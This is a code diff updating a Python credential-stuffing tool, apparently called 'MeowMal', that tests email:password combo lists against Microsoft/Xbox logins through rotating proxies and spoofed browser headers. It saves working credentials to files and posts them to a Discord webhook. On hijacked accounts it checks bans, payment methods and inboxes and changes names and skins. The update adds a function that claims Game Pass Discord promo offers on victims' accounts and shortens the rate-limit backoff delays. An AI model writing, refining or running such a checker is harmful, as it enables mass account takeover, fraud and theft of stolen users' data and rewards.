@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 import concurrent.futures
 import configparser
 import json
@@ -18,7 +17,6 @@ import uuid
 import warnings
 from datetime import datetime, timezone
 from urllib.parse import urlparse, parse_qs
-import readchar
 import requests
 import socks
 import urllib3
@@ -357,7 +355,7 @@ class UIManager:
         if not getattr(self, 'log_initialized', False):
             self.clear_screen()
             _title = Fore.CYAN
-            ascii_logo = '   __  __                    __  __       _ \n  |  \\/  |                  |  \\/  |     | | ' + '\n  | \\  / | ___  _____      _| \\  / | __ _| | ' + '\n  | |\\/| |/ _ \\/ _ \\ \\ /\\ / / |\\/| |/ _` | | ' + '\n  | |  | |  __/ (_) \\ V  V /| |  | | (_| | | ' + '\n  |_|  |_|\\___|\\___/ \\_/\\_/ |_|  |_|\\__,_|_| ' + "\n  Version: 1.0 | Dev: MeowMal Dev's \n"
+            ascii_logo = '   __  __                    __  __       _ \n  |  \\/  |                  |  \\/  |     | | ' + '\n  | \\  / | ___  _____      _| \\  / | __ _| | ' + '\n  | |\\/| |/ _ \\/ _ \\ \\ /\\ / / |\\/| |/ _` | | ' + '\n  | |  | |  __/ (_) \\ V  V /| |  | | (_| | | ' + '\n  |_|  |_|\\___|\\___/ \\_/\\_/ |_|  |_|\\__,_|_| ' + "\n  Version: 1.1 | Dev: MeowMal Dev's \n"
             print(Fore.CYAN + ascii_logo + Style.RESET_ALL)
             print('')
             print(f'{_title}Live Logs{Style.RESET_ALL}' + ' ' * max(0, getattr(self, 'width', 120) - len(self._strip_ansi('Live Logs'))))
@@ -404,17 +402,16 @@ class UIManager:
         print(f"{Fore.WHITE}Xgpu: {Fore.LIGHTCYAN_EX}{self.stats['xgpu']}{Fore.RESET}")
         print(f"{Fore.WHITE}Sfa: {Fore.YELLOW}{self.stats['sfa']}{Fore.RESET}\n")
     def add_log(self, message, level='INFO'):
-        if level not in ('HIT', 'ERROR') and (not (level == 'INFO' and message.startswith('Other:'))):
+
+        if level not in ('HIT', 'ERROR') and not (level == 'INFO' and message.startswith('Other:')):
             return
         with self._lock:
             if level == 'HIT':
                 log_entry = message
             elif level == 'ERROR':
-                log_entry = f'{Fore.RED}[!]{Style.RESET_ALL} {Fore.RED}{message}{Style.RESET_ALL}'
-            elif level == 'INFO' and message.startswith('Other:'):
-                log_entry = f'{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} {Fore.LIGHTYELLOW_EX}{message}{Style.RESET_ALL}'
-            else:
-                return
+                log_entry = f'{Fore.RED}[+] {message}{Style.RESET_ALL}'
+
+                log_entry = f'{Fore.LIGHTGREEN_EX}[+] {Fore.LIGHTYELLOW_EX}{message}{Style.RESET_ALL}'
             self.logs.append(log_entry)
             if len(self.logs) > self.max_logs:
                 self.logs = self.logs[-self.max_logs:]
@@ -479,8 +476,10 @@ class UIManager:
                 masked_pwd = '*' * len(pwd)
             if capture_obj.hypixl and capture_obj.hypixl != 'N/A':
                 user_display = capture_obj.hypixl
+            elif capture_obj.name and capture_obj.name != 'N/A':
+                user_display = capture_obj.name
             else:
-                user_display = capture_obj.name if capture_obj.name and capture_obj.name != 'N/A' else 'Unknown'
+                user_display = 'nonameset'
             account_part = f'{capture_obj.email}:{masked_pwd}:{user_display}'
             stats_parts = []
             if hasattr(capture_obj, 'bwstars') and capture_obj.bwstars:
@@ -1200,8 +1199,10 @@ class Capture:
         stats_str = ', '.join(stats_parts) if stats_parts else ''
         if self.hypixl and self.hypixl != 'N/A':
             user_display = self.hypixl
+        elif self.name and self.name != 'N/A':
+            user_display = self.name
         else:
-            user_display = self.name if self.name and self.name != 'N/A' else 'Unknown'
+            user_display = 'nonameset'
         capture_line = f'[{user_display}] {ban_status} {tags_str}{hypixel_level} {self.email}:{password_display}'
         if include_timestamp:
             import time
@@ -1898,108 +1899,77 @@ class Capture:
                 ui.log_error(f'Failed to save capture: {str(e)[:50]}')
     def handle(self, session):
         global hits, minecraft_capes, optifine_capes, inbox_matches, name_changes, payment_methods, errors
-        if self.name and self.name != 'N/A':
-            try:
-                self.hypixel()
-            except Exception:
-                errors += 1
-            try:
-                self.optifine()
-                if self.cape == 'Yes':
-                    optifine_capes += 1
-            except Exception:
-                errors += 1
-            if self.capes and self.capes != '':
-                minecraft_capes += 1
-            try:
-                self.full_access()
-            except Exception:
-                errors += 1
-            try:
-                self.namechange()
-                if self.namechange_available:
-                    name_changes += 1
-            except Exception:
-                errors += 1
-            try:
-                self.ban(session)
-            except Exception:
-                errors += 1
-            try:
-                self.check_microsoft_features()
-                if self.ms_payment_methods:
-                    payment_methods += len(self.ms_payment_methods)
-                if self.inbox_matches:
-                    inbox_matches += len(self.inbox_matches)
-            except Exception as e:
-                errors += 1
-            if config.get('setname'):
-                try:
-                    self.setname()
-                except Exception as e:
-                    if UI_ENABLED and ui:
-                         ui.log_error(f"Setname error: {e}")
-        else:
-            try:
-                self.setname()
-            except Exception as e:
-                if UI_ENABLED and ui:
-                    ui.log_error(f"Setname error: {e}")
-                pass
-        try:
-            self.check_donut_smp()
-        except Exception as e:
-            errors += 1
-            if UI_ENABLED and ui:
-                ui.log_info(f'Donut SMP error: {e}')
-        if config.get('setskin'):
-            try:
-                self.setskin()
-            except Exception as e:
-                if UI_ENABLED and ui:
-                     ui.log_error(f"Setskin error: {e}")
-        try:
-            fullcapt = self.builder(mask_password=False, include_timestamp=False)
-            masked_capt = self.builder(mask_password=True, include_timestamp=True)
-        except Exception as e:
-            if UI_ENABLED and ui:
-                ui.log_error(f"Builder error: {e}")
-            fullcapt = f"{self.email}:{self.password}"
-            masked_capt = f"{self.email}:***"
-        
-        try:
-            stats_text = fetch_meowapi_stats(self.name, self.uuid)
-            if stats_text:
-                sw = re.search(r'SW: (\d+)', stats_text)
-                if sw: self.swstars = sw.group(1)
-                
-                nw = re.search(r'NW: ([^ ]+)', stats_text)
-                if nw: self.sbnetworth = nw.group(1)
-                
-                purse = re.search(r'Purse: ([^ ]+)', stats_text)
-                if purse: self.sbcoins = purse.group(1)
-                
-                pit = re.search(r'Pit_Gold: ([^ ]+)', stats_text)
-                if pit: self.pitcoins = pit.group(1)
-                
-                fullcapt = self.builder(mask_password=False, include_timestamp=False)
-                masked_capt = self.builder(mask_password=True, include_timestamp=True)
-        except Exception:
-            stats_text = None
+
         try:
             write_dedupe(fname, 'Hits.txt', f'{self.email}:{self.password}\n')
             with stats_lock:
                 hits += 1
         except Exception as e:
             if UI_ENABLED and ui:
-                ui.log_error(f"Failed to write Hit: {e}")
-        try:
-            with file_lock:
-                open(f'results/{fname}/Capture.txt', 'a').write(fullcapt + '\n')
-        except:
-            pass
-        if UI_ENABLED and ui:
-            ui.log_hit_formatted(self, stats_text, precomputed_line=masked_capt)
+                ui.log_error(f'Failed to write Hit: {e}')
+
+        def _enrich():
+            global minecraft_capes, optifine_capes, inbox_matches, name_changes, payment_methods, errors
+            if self.name and self.name != 'N/A':
+                try: self.hypixel()
+                except Exception: errors += 1
+                try:
+                    self.optifine()
+                    if self.cape == 'Yes': optifine_capes += 1
+                except Exception: errors += 1
+                if self.capes and self.capes != '': minecraft_capes += 1
+                try: self.full_access()
+                except Exception: errors += 1
+                try:
+                    self.namechange()
+                    if self.namechange_available: name_changes += 1
+                except Exception: errors += 1
+                try: self.ban(session)
+                except Exception: errors += 1
+                try:
+                    self.check_microsoft_features()
+                    if self.ms_payment_methods: payment_methods += len(self.ms_payment_methods)
+                    if self.inbox_matches: inbox_matches += len(self.inbox_matches)
+                except Exception: errors += 1
+                if config.get('setname'):
+                    try: self.setname()
+                    except Exception: pass
+            else:
+                try: self.setname()
+                except Exception: pass
+            try: self.check_donut_smp()
+            except Exception: errors += 1
+            if config.get('setskin'):
+                try: self.setskin()
+                except Exception: pass
+            try:
+                fullcapt = self.builder(mask_password=False, include_timestamp=False)
+                masked_capt = self.builder(mask_password=True, include_timestamp=True)
+            except Exception:
+                fullcapt = f'{self.email}:{self.password}'
+                masked_capt = f'{self.email}:***'
+            try:
+                stats_text = fetch_meowapi_stats(self.name, self.uuid)
+                if stats_text:
+                    sw = re.search(r'SW: (\d+)', stats_text)
+                    if sw: self.swstars = sw.group(1)
+                    nw = re.search(r'NW: ([^ ]+)', stats_text)
+                    if nw: self.sbnetworth = nw.group(1)
+                    purse = re.search(r'Purse: ([^ ]+)', stats_text)
+                    if purse: self.sbcoins = purse.group(1)
+                    pit = re.search(r'Pit_Gold: ([^ ]+)', stats_text)
+                    if pit: self.pitcoins = pit.group(1)
+                    fullcapt = self.builder(mask_password=False, include_timestamp=False)
+                    masked_capt = self.builder(mask_password=True, include_timestamp=True)
+            except Exception:
+                stats_text = None
+            try:
+                with file_lock:
+                    open(f'results/{fname}/Capture.txt', 'a').write(fullcapt + '\n')
+            except: pass
+            if UI_ENABLED and ui:
+                ui.log_hit_formatted(self, stats_text, precomputed_line=masked_capt)
+        threading.Thread(target=_enrich, daemon=False).start()
         self.send_discord_webhook()
     def send_discord_webhook(self):
         try:
@@ -2106,15 +2076,16 @@ class Capture:
         except Exception as e:
             if UI_ENABLED and ui:
                 ui.log_error(f'[Webhook] Error: {type(e).__name__}: {str(e)[:100]}')
+
+_sftag_lock = threading.Lock()  
 def get_urlPost_sFTTag(session):
     global retries
     attempts = 0
     while attempts < maxretries:
         try:
-            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1'}
+            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1'}
             timeout_val = int(config.get('timeout', 10))
             text = session.get(sFTTag_url, headers=headers, timeout=timeout_val).text
-            
             match = RE_SFTTAG_VALUE.search(text)
             if match:
                 sFTTag = next((g for g in match.groups() if g is not None), None)
@@ -2125,13 +2096,13 @@ def get_urlPost_sFTTag(session):
                         if urlPost:
                             urlPost = urlPost.replace('&amp;', '&')
                             return (urlPost, sFTTag, session)
-        except:
+        except Exception:
             pass
         session.proxies = getproxy()
         retries += 1
         attempts += 1
-        time.sleep(15 if is_no_proxy() else 0.1)
-    return (None, None, session)
+        time.sleep(0.5 if is_no_proxy() else 0.1)
+    return ("ERROR", None, session)
 def get_xbox_rps(session, email, password, urlPost, sFTTag):
     global bad, checked, cpm, twofa, retries
     tries = 0
@@ -2174,7 +2145,7 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag):
             retries += 1
             tries += 1
             time.sleep(2 if is_no_proxy() else 0.1)
-    return ('None', session)
+    return ('ERROR', session)
 def payment(session, email, password):
     global retries, payment_methods, hits, config
     attempts = 0
@@ -2344,10 +2315,8 @@ def payment(session, email, password):
             session.proxies = getproxy()
             time.sleep(2)
 def validmail(email, password):
-    global vm, cpm, checked
+    global vm
     vm += 1
-    cpm += 1
-    checked += 1
     with open(f'results/{fname}/Valid_Mail.txt', 'a') as file:
         file.write(f'{email}:{password}\n')
     meowapi_stats = ''
@@ -2387,14 +2356,14 @@ def capture_mc(access_token, session, email, password, type):
             elif r.status_code == 429:
                 retries += 1
                 session.proxies = getproxy()
-                time.sleep((random.uniform(5, 10)) if is_no_proxy() else (0.5 if len(proxylist) > 0 else 1))
+                time.sleep(random.uniform(2, 4) if is_no_proxy() else 0.5)
                 if attempts >= maxretries:
-                    CAPTURE = Capture(email, password, None, '', None, access_token, type, session)
+                    CAPTURE = Capture(email, password, 'N/A', '', None, access_token, type, session)
                     CAPTURE.handle(session)
                     break
                 continue
             else:
-                CAPTURE = Capture(email, password, None, '', None, access_token, type, session)
+                CAPTURE = Capture(email, password, 'N/A', '', None, access_token, type, session)
                 CAPTURE.handle(session)
                 break
         except Exception:
@@ -2432,6 +2401,8 @@ def checkownership(entitlements_response):
         return 'Xbox Game Pass Ultimate'
     elif has_game_pass_pc:
         return 'Xbox Game Pass (PC)'
+
+    return None
 def claim_buddypass_offers(session, xbox_token, fname):
     global retries
     codes = []
@@ -2501,8 +2472,6 @@ def claim_buddypass_offers(session, xbox_token, fname):
                     except Exception:
                         retries += 1
                         session.proxies = getproxy()
-                        if len(proxylist) == 0:
-                            time.sleep(20)
                         continue
         else:
              for _ in range(3):
@@ -2527,9 +2496,92 @@ def claim_buddypass_offers(session, xbox_token, fname):
                 except Exception:
                     retries += 1
                     session.proxies = getproxy()
-                    if len(proxylist) == 0:
-                        time.sleep(20)
                     continue
+    except Exception:
+        pass
+
+def fetch_discord_promos(session, email, password, xbox_token, fname):
+    """
+    Fetch Discord promo offers from Xbox Game Pass.
+    Uses the XBL3.0 token with xboxlive.com relying party (same as promo.py).
+    """
+    try:
+
+        xsts_gp = None
+        for attempt in range(maxretries):
+            try:
+                r = session.post(
+                    'https://xsts.auth.xboxlive.com/xsts/authorize',
+                    json={
+                        'Properties': {'SandboxId': 'RETAIL', 'UserTokens': [xbox_token]},
+                        'RelyingParty': 'http://xboxlive.com',
+                        'TokenType': 'JWT'
+                    },
+                    headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
+                    timeout=10
+                )
+                if r.status_code == 429:
+                    time.sleep(1)
+                    continue
+                if r.status_code == 200:
+                    js = r.json()
+                    xsts_token = js.get('Token')
+                    uhs = js.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs', '')
+                    if xsts_token and uhs:
+                        xsts_gp = f'XBL3.0 x={uhs};{xsts_token}'
+                        break
+                else:
+                    break  
+            except Exception:
+                time.sleep(0.3)
+                continue
+
+        if not xsts_gp:
+            return
+
+
+        offers_r = None
+        for attempt in range(maxretries):
+            try:
+                offers_r = session.get(
+                    'https://profile.gamepass.com/v2/offers',
+                    headers={'authorization': xsts_gp},
+                    timeout=10
+                )
+                if offers_r.status_code == 429:
+                    time.sleep(1)
+                    continue
+                break
+            except Exception:
+                time.sleep(0.3)
+                continue
+
+        if offers_r is None or offers_r.status_code != 200:
+            return
+
+        for offer in offers_r.json().get('offers', []):
+            promo = None
+            status = offer.get('offerStatus')
+            if status == 'available':
+
+                try:
+                    pr = session.post(
+                        f"https://profile.gamepass.com/v2/offers/{offer.get('offerId')}",
+                        headers={'authorization': xsts_gp},
+                        timeout=10
+                    )
+                    if pr.status_code == 200:
+                        promo = pr.json().get('resource')
+                except Exception:
+                    pass
+            elif status == 'claimed':
+                promo = offer.get('resource')
+
+            if promo and 'discord' in promo.lower():
+                write_dedupe(fname, 'Discord_Promos.txt', f'{email}:{password} | {promo}\n')
+                if UI_ENABLED and ui:
+                    ui.add_log(f'Other: Discord Promo: {email} | {promo}', 'INFO')
+                break
     except Exception:
         pass
 
@@ -2537,7 +2589,7 @@ def checkmc(session, email, password, token, xbox_token):
     global retries, cpm, checked, xgp, xgpu, other, config
     acctype = None
     attempts = 0
-    max_time = time.time() + 120
+    max_time = time.time() + 90
     checkrq = None
     while attempts < maxretries and time.time() < max_time:
         attempts += 1
@@ -2546,7 +2598,8 @@ def checkmc(session, email, password, token, xbox_token):
             if checkrq.status_code == 429:
                 retries += 1
                 session.proxies = getproxy()
-                time.sleep((random.uniform(10, 15)) if is_no_proxy() else (0.1 if len(proxylist) > 0 else 1))
+
+                time.sleep(random.uniform(3, 6) if is_no_proxy() else 0.5)
                 continue
             else:
                 break
@@ -2555,37 +2608,57 @@ def checkmc(session, email, password, token, xbox_token):
             if UI_ENABLED and ui:
                 ui.log_error(f'Network error: {str(e)[:100]}')
             session.proxies = getproxy()
-            time.sleep(2 if is_no_proxy() else 0.1)
+            time.sleep(1 if is_no_proxy() else 0.1)
             continue
     if time.time() >= max_time:
         if UI_ENABLED and ui:
-            ui.log_error(f'Timeout checking {email} (took >120s)')
+            ui.log_error(f'Timeout checking {email} (took >90s)')
         return False
     if checkrq is not None and checkrq.status_code == 200:
         acctype = checkownership(checkrq.json())
         if acctype is None:
-            return False
-        
+
+            try:
+                profilerq = session.get('https://api.minecraftservices.com/minecraft/profile',
+                                        headers={'Authorization': f'Bearer {token}'}, timeout=10)
+                if profilerq.status_code == 200:
+                    acctype = 'Normal Minecraft'  
+                else:
+                    return False  
+            except Exception:
+                return False
+
+
         name, uuid_str, capes_list = 'N/A', 'N/A', []
         try:
             profilerq = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {token}'}, timeout=10)
             if profilerq.status_code == 200:
                 p_data = profilerq.json()
-                name = p_data.get('name', 'N/A')
-                uuid_str = p_data.get('id', 'N/A')
+                name = p_data.get('name', 'N/A') or 'N/A'
+                uuid_str = p_data.get('id', 'N/A') or 'N/A'
                 capes_data = p_data.get('capes', [])
                 for c in capes_data:
                     if c.get('alias'): capes_list.append(c['alias'])
-        except:
+        except Exception:
             pass
-            
+
         capes_str = ', '.join(capes_list)
+
+
         try:
-             capture = Capture(email, password, name, capes_str, uuid_str, token, acctype, session)
-             if 'Game Pass' not in acctype:
-                 capture.handle(session)
+            capture = Capture(email, password, name, capes_str, uuid_str, token, acctype, session)
+            capture.handle(session)
         except Exception as e:
-             if UI_ENABLED and ui: ui.log_error(f"Capture error: {e}")
+            if UI_ENABLED and ui:
+                ui.log_error(f'Capture error: {e}')
+
+            try:
+                write_dedupe(fname, 'Hits.txt', f'{email}:{password}\n')
+                with stats_lock:
+                    global hits
+                    hits += 1
+            except Exception:
+                pass
 
         if acctype == 'Xbox Game Pass Ultimate' or acctype == 'Normal Minecraft (with Game Pass Ultimate)':
             with stats_lock:
@@ -2593,8 +2666,10 @@ def checkmc(session, email, password, token, xbox_token):
             write_dedupe(fname, 'XboxGamePassUltimate.txt', f'{email}:{password}\n')
             if 'Normal' in acctype:
                 write_dedupe(fname, 'Normal.txt', f'{email}:{password}\n')
-            claim_buddypass_offers(session, xbox_token, fname)
-            capture_mc(token, session, email, password, acctype)
+            try: claim_buddypass_offers(session, xbox_token, fname)
+            except Exception: pass
+            try: fetch_discord_promos(session, email, password, xbox_token, fname)
+            except Exception: pass
             return True
         elif acctype == 'Xbox Game Pass (PC)' or acctype == 'Normal Minecraft (with Game Pass)':
             with stats_lock:
@@ -2602,11 +2677,10 @@ def checkmc(session, email, password, token, xbox_token):
             write_dedupe(fname, 'XboxGamePass.txt', f'{email}:{password}\n')
             if 'Normal' in acctype:
                 write_dedupe(fname, 'Normal.txt', f'{email}:{password}\n')
-            claim_buddypass_offers(session, xbox_token, fname)
-            try:
-                capture_mc(token, session, email, password, acctype)
-            except:
-                pass
+            try: claim_buddypass_offers(session, xbox_token, fname)
+            except Exception: pass
+            try: fetch_discord_promos(session, email, password, xbox_token, fname)
+            except Exception: pass
             return True
         elif acctype == 'Normal Minecraft':
             write_dedupe(fname, 'Normal.txt', f'{email}:{password}\n')
@@ -2645,7 +2719,7 @@ def create_optimized_session():
     
     session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'DNT': '1', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1'})
     
-    pool_size = 4
+    pool_size = max(1, int(config.get('connection_pool_size', 10)))
     
     use_proxies = config.get('use_proxies', False)
     backoff = 0.5
@@ -2654,115 +2728,81 @@ def create_optimized_session():
     session.mount('https://', adapter)
     session.mount('http://', adapter)
     return session
-def authenticate(email, password, use_optimized=False):
+def authenticate(email, password, use_optimized=True):
     global retries, bad, checked, cpm, twofa
-    
     current_try = 0
-    counters_incremented = False
-    
     while current_try <= maxretries:
         try:
-            session = create_optimized_session() if use_optimized else requests.Session()
+            session = create_optimized_session()
             session.cookies.clear()
-            
-            try:
-                if proxytype != "'4'":
+            if proxytype != "'4'":
+                try:
                     proxy_config = getproxy()
                     if proxy_config:
                         session.proxies = proxy_config
-                        if UI_ENABLED and ui:
-                            ui.log_info(f'Using proxy for {email[:3]}***')
-            except Exception as proxy_error:
-                if UI_ENABLED and ui:
-                    ui.log_error(f'Proxy error: {str(proxy_error)}')
-            
+                except Exception:
+                    pass
             urlPost, sFTTag, session = get_urlPost_sFTTag(session)
-            if urlPost is None or sFTTag is None:
-                if not counters_incremented:
-                    if UI_ENABLED and ui:
-                        ui.log_bad(email)
-                if current_try >= maxretries:
-                     return False
-                return False
-
+            if urlPost == 'ERROR' or urlPost is None or sFTTag is None:
+                current_try += 1
+                time.sleep(0.5 if not is_no_proxy() else 1)
+                continue
             token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
-            
+            if token == 'ERROR':
+
+                current_try += 1
+                try: session.close()
+                except: pass
+                continue
             if token == '2FA':
-                twofa += 1
-                if not counters_incremented:
-                    if UI_ENABLED and ui:
-                        ui.log_2fa(email)
-                return False
-                
+                with stats_lock:
+                    twofa += 1
+                if UI_ENABLED and ui:
+                    ui.log_2fa(email)
+                try: session.close()
+                except: pass
+                return '2FA'
             elif token == 'None' or token is None:
-                if not counters_incremented:
-                    if UI_ENABLED and ui:
-                        ui.log_bad(email)
+                if UI_ENABLED and ui:
+                    ui.log_bad(email)
+                try: session.close()
+                except: pass
                 return False
-            
             if token != 'None' and token != '2FA':
                 hit = False
                 try:
                     xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com', 'RpsTicket': token}, 'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT'}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=int(config.get('timeout', 10)))
                     js = xbox_login.json()
                     xbox_token = js.get('Token')
-                    
-                    if xbox_token != None:
+                    if xbox_token is not None:
                         uhs = js['DisplayClaims']['xui'][0]['uhs']
                         xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={'Properties': {'SandboxId': 'RETAIL', 'UserTokens': [xbox_token]}, 'RelyingParty': 'rp://api.minecraftservices.com/', 'TokenType': 'JWT'}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=int(config.get('timeout', 10)))
-                        
                         js = xsts.json()
                         xsts_token = js.get('Token')
-                        
-                        if xsts_token != None:
+                        if xsts_token is not None:
                             access_token = mc_token(session, uhs, xsts_token)
-                            if access_token != None:
+                            if access_token is not None:
                                 hit = checkmc(session, email, password, access_token, xbox_token)
-                except Exception as e:
+                except Exception:
                     pass
-                
                 if config.get('payment') is True:
-                    try:
-                        payment(session, email, password)
-                    except:
-                        pass
-                
-                if check_microsoft_account and (config.get('check_microsoft_balance') or config.get('check_reward_points') or config.get('scan_inbox')):
-                    try:
-                        ms_results = check_microsoft_account(session, email, password, config.data, fname)
-                    except:
-                        pass
-                
-                if hit == False:
+                    try: payment(session, email, password)
+                    except: pass
+                try: session.close()
+                except: pass
+                if not hit:
                     validmail(email, password)
-                    counters_incremented = True
+                    return 'VALID_MAIL'
                 else:
-                    counters_incremented = True
-                
-                try:
-                    session.close()
-                except:
-                    pass
-                return bool(hit)
-                
+                    return True
         except Exception as e:
             current_try += 1
             retries += 1
-            if UI_ENABLED and ui and (current_try == 1):
-                ui.log_error(f'[{email}] Auth exception: {type(e).__name__}, retrying...')
-            
-            try:
-                session.close()
-            except:
-                pass
-                
+            try: session.close()
+            except: pass
             if current_try > maxretries:
-                 if not counters_incremented:
-                    pass
-                 if UI_ENABLED and ui:
-                    ui.log_error(f'[{email}] Failed after {maxretries} retries: {type(e).__name__}')
-                    ui.log_bad(email)
-                 return False
+                return 'ERROR'
+    return 'ERROR'
 
 def fetch_proxies_from_api(proxy_type='http'):
     global proxylist, last_proxy_fetch, proxy_api_url, proxy_request_num, proxy_time, api_socks4, api_socks5, api_http
@@ -3021,17 +3061,7 @@ def Checker(combo):
             return
         result = False
         try:
-            bypass = pre_check_combo(str(email), str(password))
-            
-            if bypass == "HIT" or bypass == "UNKNOWN":
-                result = authenticate(str(email), str(password), use_optimized=True)
-            elif bypass == "2FA":
-
-                result = True 
-            elif bypass == "BAD":
-                result = False
-            else:
-                result = False
+            result = authenticate(str(email), str(password))
                 
             if warn_on_slow and time.time() - start_time > warn_threshold:
                 if UI_ENABLED and ui:
@@ -3047,8 +3077,15 @@ def Checker(combo):
         with stats_lock:
             checked += 1
             cpm += 1
-        if result:
+        if result is True or result == "HIT":
             pass
+        elif result == "2FA":
+            pass
+        elif result == "VALID_MAIL":
+            pass
+        elif result == "ERROR":
+            with stats_lock:
+                errors += 1
         else:
             with stats_lock:
                 bad += 1
@@ -3135,7 +3172,7 @@ def Load():
             for line in lines:
                 line = line.strip()
                 if line and ':' in line:
-                    parts = line.split(':')
+                    parts = line.split(':', 1)
                     if len(parts) >= 2:
                         email_lower = ''.join(c for c in parts[0].strip().lower() if c.isprintable() and not c.isspace())
                         password = parts[1].strip()
@@ -3323,16 +3360,16 @@ def Main():
         print(f"{Fore.CYAN}{'=' * 60}{Fore.RESET}\n")
         if UI_ENABLED and ui:
             ui.log_info(f'⏳ Collecting Final Live Stats...')
-        for countdown in range(5, 0, -1):
+        for countdown in range(30, 0, -1):
             print(f'{Fore.YELLOW}⏳ Collecting Live Stats... {countdown}s remaining{Fore.RESET}', end='\r')
             try:
-                utils.set_title(f'⏳ Collecting Live Stats... {countdown}s | Hits: {hits} - Bad: {bad} - 2FA: {twofa} - CPM: {cpm1 * 60}')
+                utils.set_title(f'⏳ Collecting Live Stats... {countdown}s | Hits: {hits} - Bad: {bad} - 2FA: {twofa}')
             except:
                 pass
             if UI_ENABLED and ui:
-                ui.log_info(f'⏳ Collecting Live Stats... {countdown}s remaining')
                 ui.update_stats(hits=hits, bad=bad, twofa=twofa, valid_mail=vm, xgp=xgp, xgpu=xgpu, other=other, mfa=mfa, sfa=sfa, minecraft_capes=minecraft_capes, optifine_capes=optifine_capes, inbox_matches=inbox_matches, name_changes=name_changes, payment_methods=payment_methods, checked=checked, total=len(Combos), cpm=cpm1 * 60, retries=retries, errors=errors)
                 ui.show_ui_screen()
+            time.sleep(1)
         try:
             hits_file = f'results/{fname}/Hits.txt'
             if os.path.exists(hits_file):
